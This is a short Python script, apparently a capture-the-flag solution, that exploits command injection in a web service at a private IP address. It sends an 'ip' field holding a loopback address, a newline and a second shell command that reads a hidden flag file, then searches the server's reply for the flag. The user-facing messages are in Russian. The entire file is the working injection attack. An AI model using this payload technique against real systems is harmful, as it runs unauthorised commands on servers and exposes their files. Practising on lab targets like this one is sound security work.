import requests
import re

TARGET_URL = "http://10.24.249.158:5000"

payload = "127.0.0.1\nhead .hidden/.flag"

response = requests.post(TARGET_URL, data={"ip": payload})

flag_match = re.search(r'flag\{[^{}]*\}', response.text)

if flag_match:
    print("[+] Флаг найден:", flag_match.group(0))
else:
    print("[-] Флаг не найден. Попробуйте другие команды.")
    print("\nОтвет сервера:")
    print(response.text[-500:])
